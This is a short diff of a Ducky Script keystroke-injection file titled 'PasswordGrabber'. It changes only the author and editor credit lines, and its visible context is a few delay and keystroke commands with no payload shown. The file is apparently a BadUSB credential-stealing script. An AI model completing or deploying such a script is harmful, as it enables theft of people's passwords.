@@ -1,5 +1,6 @@
 REM Title: PasswordGrabber
-REM Arthor Slurpy https://github.com/SlurpyBecomeDev
+REM Arthor makozort https://github.com/makozort
+REM Script Editor Slurpy https://github.com/SlurpyBecomeDev
 DEFAULT_DELAY 350
 DELAY 1000
 CTRL ESC
